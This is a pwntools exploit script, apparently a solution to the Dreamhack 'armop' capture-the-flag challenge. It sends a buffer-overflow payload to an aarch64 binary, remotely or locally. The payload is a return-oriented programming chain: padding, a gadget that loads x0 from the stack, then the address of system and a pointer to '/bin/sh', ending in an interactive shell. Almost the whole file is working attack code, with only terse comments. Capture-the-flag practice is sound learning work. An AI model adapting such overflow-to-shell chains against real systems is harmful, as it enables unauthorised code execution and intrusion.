from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/armop/deploy/prob')

context.arch = 'aarch64'
cyberedu = 'host8.dreamhack.games:18437'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

system = 0x0401b00
binsh = 0x004671c8
#0x0000000000435e38: ldr x0, [sp, #0x60]; ldp x29, x30, [sp], #0x80; ret; 
gadget = 0x435e38

payload = ( b"A" * 16 + #padding to x29
            b"B" * 8 + #x29
            p64(gadget) +
            p64(0x0) + #we dont care abt x29
            p64(system) + #we wrote up to sp + 0x10
            b"A"*0x50 +
            p64(binsh)
          )
            
p.sendline(payload)    

p.interactive()
